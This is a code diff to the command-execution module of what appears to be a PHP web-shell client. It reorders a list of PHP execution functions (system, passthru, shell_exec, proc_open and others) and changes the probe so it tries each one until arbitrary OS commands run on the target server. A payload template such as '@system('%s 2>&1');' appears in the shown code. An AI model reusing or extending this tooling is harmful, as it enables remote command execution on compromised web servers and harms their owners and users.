@@ -17,8 +17,8 @@ class Sh(Module):
     visible = False
     
     
-    vectors_order = { 'shell.php' : [  "system()", "passthru()", "shell_exec()", "popen()", 
-                                     "exec()", "perl->system()", "pcntl_exec()", "python_eval()", "proc_open()"] }
+    vectors_order = { 'shell.php' : [  "perl->system()", "system()", "passthru()", "shell_exec()", "popen()", 
+                                     "exec()", "pcntl_exec()", "python_eval()", "proc_open()"] }
     
     
     vectors = { 'shell.php' : { "system()"       : "@system('%s 2>&1');",
@@ -56,14 +56,14 @@ class Sh(Module):
             rand     = random.randint( 11111, 99999 )
             response = self.run( "echo %d" % rand, True, self.vectors[interpreter][vector] )
             
-            
             if response == str(rand):
                 self.payload = self.vectors[interpreter][vector]
                 print "[shell.sh] Shell interpreter loaded using method '%s'" % vector
-                return
+                return True
 
         except:
             pass
+        return False
         
         
     def _probe( self ):
@@ -73,9 +73,11 @@ class Sh(Module):
             return self.__execute_payload(interpreter, vector)
         
         for interpreter in self.vectors:
-            for vector in self.vectors_order[interpreter]:
-                if interpreter in self.modhandler.loaded_shells:
-                    return self.__execute_payload(interpreter, vector)
+            if interpreter in self.modhandler.loaded_shells:
+                for vector in self.vectors_order[interpreter]:
+                    response = self.__execute_payload(interpreter, vector)
+                    if response:
+                        return response
                     
 
                 
